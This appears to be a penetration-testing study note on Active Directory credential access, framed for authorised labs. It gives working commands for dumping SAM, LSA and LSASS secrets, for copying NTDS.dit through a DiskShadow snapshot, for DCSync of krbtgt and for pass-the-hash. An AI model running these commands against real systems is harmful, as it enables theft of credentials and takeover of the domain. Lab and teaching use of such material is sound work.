# Credential Access (Local, Session, Domain)

Once you can run code as a privileged user, you collect the secrets that unlock the *next* identity. The mistake to avoid is conflating five very different sources: a local SAM hash is not a domain hash, and DCSync is not NTDS extraction.

## Goal
Given your observed access and permissions, pick the **correct** credential source, extract it safely (off-host parsing), and reuse it, knowing exactly what each source can and cannot yield.

## Open this when
- You reached local admin / SYSTEM on a host, or landed on a DC ([[00_AD_METHODOLOGY]] Step 7).
- A BloodHound edge granted replication rights ([[02_bloodhound_and_acl_paths#[CORE] DCSync, GetChanges, and GetChangesAll|DCSync edge card]]).

> [!important] Five sources, never conflate them
> **Local SAM** = local accounts on *one* host. **NTDS** = the whole domain's hashes (on a DC). **DCSync** = pull domain hashes *over the wire* with replication rights (no shell on the DC needed). They answer different questions and need different prerequisites.

---

## Source selection table (this is the gate: read your access, then pick the row)

| Source | Prerequisite | Yields | Does NOT yield |
| --- | --- | --- | --- |
| **Offline SAM + SYSTEM** | read both hives (SeBackup / Backup Ops / a `Repair` backup) | **local** account NTLM hashes for that host | domain account secrets |
| **Remote SAM / LSA** | **local admin** on the host (over SMB) | local hashes; LSA secrets (service acct passwords, cached logons, machine acct) | arbitrary domain user hashes |
| **LSASS / session creds** | admin + `SeDebug`; LSASS not protected | plaintext/NTLM/**Kerberos tickets** of users with sessions on *this* host | secrets of users who never logged on here |
| **NTDS.dit + SYSTEM** | privileged DC session with a readable VSS/backup path, such as Administrator/SYSTEM or usable SeBackup/Backup Operators access | **every** domain account hash + `krbtgt` | plaintext passwords or automatic service access |
| **DCSync** | replication rights (GetChanges **and** GetChangesAll), e.g. Domain/Enterprise Admin or a granted ACE | any/all domain hashes over the network, **no DC shell needed** | plaintext (hashes only) |

Read your access, then pick the row, don't run the biggest tool by reflex.

---

## Extract safely (off-host parsing, integrity)

**Prefer copy-then-parse-on-Kali** over running heavy tooling on the target (less AV risk, no live-hive locks).

### Local SAM + SYSTEM (one host's local accounts)
```batch
reg save HKLM\SAM    %TEMP%\SAM.hive
reg save HKLM\SYSTEM %TEMP%\SYSTEM.hive
:: live SAM is locked; Backup Operators can copy via robocopy /b or the Backup API
```
```bash
# on Kali, from the copied hives:
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```
Detailed SeBackup/Backup-Operators route → [[02_token_privileges]] Case 2. Hive-backup hotspots (`C:\Windows\Repair\`, `RegBack`) → [[05_stored_credentials]].
**Verify:** secretsdump prints `LOCAL` account hashes. **Fail:** access denied reading the hives = you lack SeBackup / Backup Operators; empty = wrong hive pair.

### Remote SAM / LSA (local admin over SMB)
```bash
nxc smb <ip> -u <admin> -p '<pass>' --local-auth --sam        # local hashes
nxc smb <ip> -u <admin> -p '<pass>' --local-auth --lsa        # LSA secrets, cached, machine acct
impacket-secretsdump <domain>/<admin>:'<pass>'@<ip>           # full remote dump (domain-joined admin)
```
`--local-auth` = the admin is a **local** account; drop it for a **domain** admin. LSA secrets often reveal *service account* passwords that reuse across the domain.
**Verify:** hashes / LSA secrets returned. **Fail:** `STATUS_ACCESS_DENIED` = not actually local admin (re-read the `Pwn3d!` meaning, [[01_credentials_and_spraying]] Step 4).

### LSASS session credentials: full dump, off-host parse, cleanup

#### TLDR

LSASS can hold passwords, NTLM hashes, TGTs, and service tickets for identities with sessions on this host. A privileged dump gives credential material, not service authorization or a shell.

#### When you see this

You have a Windows session and `tasklist /v`, `quser`, or `query user` shows a logged-on identity whose material may advance the objective.

#### Check first

Prove local Administrator or SYSTEM, high integrity, and the required privilege. Confirm the target process and architecture before transferring a matching ProcDump binary.

```powershell
whoami /groups
whoami /priv
whoami /all
tasklist /v
quser
Get-Process lsass | Select-Object Id,Path
[Environment]::Is64BitOperatingSystem
```

If you are not elevated or no useful session exists, stop. Transfer ProcDump and verify its integrity through [[01_orientation#File transfer - Kali to Windows|file transfer]]. Invasive live-memory tooling stays out of the low-privilege path.

#### If confirmed

Use one full dump, verify it, transfer it off-host, then parse it with pypykatz.

```powershell
& "$env:TEMP\procdump64.exe" -accepteula -ma lsass.exe "$env:TEMP\lsass.dmp"
Get-Item "$env:TEMP\lsass.dmp" | Select-Object FullName,Length,LastWriteTime
Get-FileHash "$env:TEMP\lsass.dmp"
```

```bash
pypykatz lsa minidump lsass.dmp
```

Distinguish the parser output before using it: password, NTLM hash, TGT, and TGS/service ticket are different capability classes. Validate one plausible identity/service pair first through [[01_credentials_and_spraying]].

#### Expected result

A plausible nonzero dump exists, its transferred hash matches, and pypykatz identifies material for an expected session. Interpret failures:

- access denied: the process is not actually elevated, the privilege is unavailable, or a security control blocked access;
- tool disappears or will not execute: AV, application control, or policy;
- small, empty, or unparsable dump: wrong architecture/tool mode, incomplete dump, PPL/Credential Guard, unsupported build, or parser mismatch;
- valid dump with no useful identity: no useful session existed on this host.

#### What did I gain?

Record `credential or NTLM hash`, `Kerberos TGT`, or `Kerberos service ticket and exact SPN scope` in [[00_AD_METHODOLOGY#Capability ledger: what did I gain?]]. Do not record service authorization or host execution without a separate test.

#### Next

Protect the off-host copy, remove the target-side dump after transfer, refresh the appropriate logon or ticket context, then re-enumerate as the recovered principal.

```powershell
Remove-Item "$env:TEMP\lsass.dmp" -Force
```

### NTDS.dit: offline NTDS via SeBackup / Backup Operators on a DC

On a domain controller, a usable backup context plus VSS can copy locked `NTDS.dit`. On a member host, the same privilege yields only that host's local files and hives.

**Checklist**
- [ ] host is a DC (`DomainRole` 4 or 5)
- [ ] `SeBackupPrivilege`, Backup Operators, Administrator, or SYSTEM is proven in the current token
- [ ] VSS and `diskshadow.exe` are available
- [ ] staging volume has enough free space
- [ ] unused expose drive and cleanup plan recorded

```powershell
(Get-CimInstance Win32_ComputerSystem).DomainRole
whoami /priv
whoami /groups
Get-Service VSS
Get-Command diskshadow.exe
Get-PSDrive -Name C
```

**Step 1: Create a DiskShadow script**

Save the following as `<diskshadow_script>.txt`. Replace `X:` if that drive is in use; `<staging_path>` must already exist.

```text
set context persistent nowriters
set metadata <staging_path>\<metadata_file>.cab
add volume C: alias ntdsvol
create
expose %ntdsvol% X:
```

**Step 2: Create and copy the snapshot**

Collect `ntds.dit` and the SYSTEM hive from this same DC.

```batch
diskshadow /s <diskshadow_script>.txt
robocopy /b X:\Windows\NTDS <staging_path> ntds.dit
reg save HKLM\SYSTEM <staging_path>\SYSTEM.hive /y
```

Verify nonzero files and hash them before transfer:

```powershell
Get-Item "<staging_path>\ntds.dit","<staging_path>\SYSTEM.hive" | Select-Object FullName,Length,LastWriteTime
Get-FileHash "<staging_path>\ntds.dit","<staging_path>\SYSTEM.hive"
```

Transfer both files through [[01_orientation#File transfer - Kali to Windows|file transfer]], hash them again, then parse off-host:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL
```

**Verify:** Transferred hashes match and `secretsdump` includes `krbtgt` plus expected domain accounts. A snapshot alone is not credential access.

**Failure:** Wrong host role -> local-only route. DiskShadow access denied -> unusable token/capability. VSS/create failure -> volume, service, script, storage, or policy issue. Copy access denied -> missing backup semantics or capability. Boot-key, PEK, or corruption error -> incomplete or mismatched `NTDS.dit` and SYSTEM hive.

**Capability:** Offline domain credential material. Validate one exact identity/service pair before recording service authorization.

**Cleanup:** In `diskshadow`, list shadows, record the exact Shadow Copy ID created above, then remove only that snapshot.

```text
list shadows all
unexpose X:
delete shadows id <shadow_copy_id>
reset
```

Remove the staging copies and script only after transfer and hash verification. Confirm `X:` and the recorded Shadow Copy ID are gone.

**Next:** Protect the off-host files, validate one recovered credential, and re-enumerate through [[00_AD_METHODOLOGY]]. This is whole-domain collection; do not blast every recovered account.

**Remote DC-administrator alternative:**

```bash
impacket-secretsdump <domain>/<dcadmin>:'<pass>'@<DC_IP> -just-dc
```

### DCSync (replication rights, no DC shell)
```bash
impacket-secretsdump <domain>/<user>:'<pass>'@<DC_IP> -just-dc-user '<target>'      # one account
impacket-secretsdump <domain>/<user>:'<pass>'@<DC_IP> -just-dc-user 'krbtgt'        # krbtgt (for golden-ticket persistence)
# Windows: mimikatz lsadump::dcsync /user:<domain_netbios>\<target_user>
```
Prerequisite is the **replication-rights** combination, not local admin. Confirm the right first ([[02_bloodhound_and_acl_paths#[CORE] DCSync, GetChanges, and GetChangesAll|DCSync edge card]]).
**Verify:** the target's NTLM hash is returned. **Fail:** `RPC_S_ACCESS_DENIED` / `Rejected` = you don't hold GetChanges + GetChangesAll (re-verify the ACE).

---

## Pass-the-hash boundaries (what a hash actually buys)
```bash
nxc smb   <ip> -u <user> -H <NTLM> --local-auth     # LOCAL account hash
nxc smb   <ip> -u <user> -H <NTLM>                   # DOMAIN account hash
evil-winrm -i <ip> -u <user> -H <NTLM>               # if WinRM allowed for this user
impacket-psexec -hashes :<NTLM> <user>@<ip>          # SMB exec (local admin needed)
```
- **NTLM hashes** pass to NTLM-accepting protocols (SMB/WinRM/psexec). A Kerberos-only path needs a **ticket**, not a hash (overpass / pass-the-ticket → [[04_kerberos_advanced_paths]]).
- **Local vs domain context** (`--local-auth`) is decisive: a local Administrator hash works on hosts sharing that local account, not on domain accounts.
- **Authentication success is not authorization.** A hash that authenticates may still not be admin on the target, the same three-outcome reading as [[01_credentials_and_spraying]].

### [REFERENCE] DSRM, Directory Services Restore Mode, local Administrator hash on a DC

#### TLDR

A SAM hash is a local-account hash. On a domain controller, the SAM built-in Administrator secret is the DSRM account secret. DSRM is still not the domain Administrator account and must not be labelled or broadly tested as one.

#### When you see this

You extracted the built-in Administrator hash from a DC's local SAM, or separate evidence suggests the DSRM secret may match a domain credential.

#### Check first

Keep the hash local/DSRM-only unless independent evidence shows password synchronization, password reuse, or an identical hash in separately obtained domain data. Compare evidence first. Do not spray the value.

#### If confirmed

Test one explicit domain account, one DC, and one protocol in domain context. Do not use `--local-auth` for this narrow comparison.

```bash
nxc smb <dc_fqdn> -d <domain_fqdn> -u <explicit_domain_user> -H <ntlm_hash>
```

#### Expected result

`(+)` proves only domain-context authentication for that explicit account. `Pwn3d!` on SMB is separate authorization evidence. Failure means the local/DSRM hash is not the domain secret in the tested context. Return it to local/DSRM-only scope and stop.

#### What did I gain?

Normally, `credential or NTLM hash` scoped to DSRM on one DC. Only a successful controlled domain test adds `service authentication` for the explicit domain identity.

#### Next

If domain authentication succeeds, validate authorization separately and re-enumerate through [[00_AD_METHODOLOGY]]. Without the evidence gate or a successful test, do not widen the target set.

---

## After acquisition: re-enumerate, don't assume
- A recovered hash/password does **not** work everywhere, so test it and track results in the matrix.
- Every new identity → re-run share/service/LDAP/BloodHound enumeration as that principal ([[00_AD_METHODOLOGY]] Step 6).
- **Verification per source:** local SAM → PtH to a service; LSA → try the service-account password across the domain; NTDS/DCSync → reuse a specific target hash and confirm access.

## Cleanup & handling (authorised labs)
- Treat dumped hives/dumps/tickets as sensitive: know where you stored them, remove copies you no longer need.
- Record what you extracted and from where for the report; don't leave hive copies lying in world-readable paths on the target.

> [!important] Helpline
> Match the source to your access: local admin → SAM/LSA/LSASS; DC → NTDS; replication rights → DCSync (no DC shell). Parse off-host. **NTLM hash ≠ Kerberos ticket; local context ≠ domain context; auth ≠ authorization.** Re-enumerate after every new secret.
